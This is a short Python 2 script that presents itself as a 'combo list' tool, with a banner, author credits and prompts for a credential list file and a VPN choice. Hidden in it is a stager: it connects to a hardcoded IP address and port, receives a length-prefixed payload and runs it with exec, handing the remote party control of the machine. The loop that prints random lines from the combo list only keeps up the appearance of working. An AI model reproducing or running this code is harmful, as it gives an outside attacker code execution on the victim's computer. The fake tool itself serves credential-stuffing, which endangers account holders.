import os,sys,time,socket,struct,random
print '\x1b[93m'
os.system('figlet ......             Black ....... ')
print '\x1b[92m   \n          ################################               \n          ##\x1b[91m  By:-Ahmed Kaissar    \x1b[92m     ##\n          ##\x1b[91m  By:-Ahsan Alsaeh  \x1b[92m        ##\n          ##\x1b[91m  By:-Lartistou Ala \x1b[92m        ##\n          ##                            ##\n          ################################\n\n'

lob=raw_input("Combo List: ")
print(" ")
jkl=raw_input("Use VPN?(Y/N): ")
#if jkl == "Y" or "y":
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('3.137.63.131',18199))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})

#else:

for i in range(1, 1000000):
 time.sleep(0.8)
 print(random.choice(list(open(lob))))
print("Done!")
